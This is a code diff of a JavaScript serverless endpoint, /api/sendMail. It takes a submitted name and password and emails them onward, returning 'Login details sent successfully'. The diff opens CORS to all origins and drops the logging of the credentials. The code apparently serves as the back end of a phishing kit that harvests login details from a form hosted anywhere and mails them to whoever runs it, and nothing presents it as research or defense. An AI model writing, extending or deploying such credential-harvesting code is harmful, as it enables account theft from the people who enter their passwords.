@@ -1,20 +1,38 @@
+import nodemailer from 'nodemailer';
+import Cors from 'cors';
+
+// Initialize the cors middleware
+const cors = Cors({
+  origin: '*', // allow all origins (or set your domain)
+  methods: ['GET', 'HEAD', 'POST', 'OPTIONS'],
+});
+
+// Helper method to wait for middleware to execute before continuing
+function runMiddleware(req, res, fn) {
+  return new Promise((resolve, reject) => {
+    fn(req, res, (result) => {
+      if (result instanceof Error) return reject(result);
+      return resolve(result);
+    });
+  });
+}
+
 export default async function handler(req, res) {
-  await runMiddleware(req, res, corsMiddleware);
-  console.log('API /api/sendMail called with method:', req.method);
+  // Run CORS middleware to handle OPTIONS preflight
+  await runMiddleware(req, res, cors);
+
+  if (req.method === 'OPTIONS') {
+    // Respond to OPTIONS preflight immediately
+    return res.status(204).end();
+  }
 
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Method not allowed' });
   }
 
   const { name, password } = req.body;
-  console.log('Received name:', name);
-  console.log('Received password:', password);
-
   const sanitizedName = typeof name === 'string' ? name.trim() : '';
   const sanitizedPassword = typeof password === 'string' ? password.trim() : '';
-
-  console.log('Sanitized name:', sanitizedName);
-  console.log('Sanitized password:', sanitizedPassword);
 
   try {
     const transporter = nodemailer.createTransport({
@@ -34,6 +52,7 @@ export default async function handler(req, res) {
     };
 
     await transporter.sendMail(mailOptions);
+
     return res.status(200).json({ message: 'Login details sent successfully' });
   } catch (error) {
     console.error('Error sending email:', error);
